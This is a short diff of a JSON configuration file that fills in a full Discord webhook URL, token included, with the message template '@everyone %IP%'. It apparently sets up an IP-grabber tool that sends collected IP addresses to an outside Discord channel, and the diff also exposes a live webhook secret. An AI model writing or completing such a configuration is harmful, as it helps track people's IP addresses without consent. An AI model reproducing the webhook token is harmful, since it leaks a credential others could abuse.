@@ -1,6 +1,6 @@
 {
-  "webhook": "YOUR WEBHOOK URL HERE",
-  "webhook_name": "Webhook",
+  "webhook": "https://discord.com/api/webhooks/1247284020748882023/8D07m4q6Npmdleg2ibtj6O7YL8LMVY3tUUgnvlzXXNmelnINrm2tQfbVlB4vfxT_zR16",
+  "webhook_name": "sigma skibidi rizz",
   "webhook_avatar": "https://cdn.discordapp.com/embed/avatars/0.png",
   "message": "@everyone %IP%",
 
